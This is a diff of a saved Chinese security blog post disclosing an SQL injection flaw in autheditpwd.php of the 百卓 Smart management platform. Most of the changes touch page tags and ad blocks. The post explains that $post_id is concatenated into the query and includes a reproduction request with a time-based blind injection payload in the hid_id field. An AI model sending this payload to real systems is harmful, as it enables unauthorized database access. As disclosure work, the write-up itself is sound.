@@ -7,17 +7,17 @@ asset_dir: assets/百卓smart管理平台-autheditpwd.php-sql注入漏洞
 # 百卓Smart管理平台 autheditpwd.php SQL注入漏洞
 
 [Mrxn](https://mrxn.net/author/1)- 发表于2025/1/17 17:10
-- 1017浏览
+- 1019浏览
 - [0评论](#comment)
 - 13分钟阅读
 
 深入探索
 
-sql
+计算机安全
+
+百卓网络
 
 SQL
-
-北京百卓网络技术有限公司
 
 ---
 
@@ -61,19 +61,11 @@ if($post_mode == "edit")
 }
 ```
 
-深入探索
-
-SQL注入检测工具
-
-JSON处理工具
-
-安全运维咨询
-
 一眼丁真！`$post_id`存在[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5 "SQL注入")漏洞。  
 `$post_id`是直接拼接进SQL语句中，从而造成SQL注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "漏洞")。  
 要想进入此逻辑也简单，只需要 `$post_mode` 等于 `edit` 即可！开干！
 
-漏洞扫描服务
+代码安全审计
 
 # 漏洞复现
 
@@ -84,6 +76,14 @@ Content-Type: application/x-www-form-urlencoded
 
 oldpwd=1&pwd=1&confirmpwd=1&mode=edit&hid_id=(select*from(select(sleep(4)))a)
 ```
+
+深入探索
+
+网络安全会议
+
+安全认证考试
+
+Windows安全工具
 
 [[![百卓Smart管理平台 autheditpwd.php SQL注入漏洞](images/img-001-8b7b67d851fc.png)](https://mrxn.net/content/uploadfile/202501/49cb1737105043.png)](https://mrxn.net/content/uploadfile/202501/49cb1737105043.png)
 
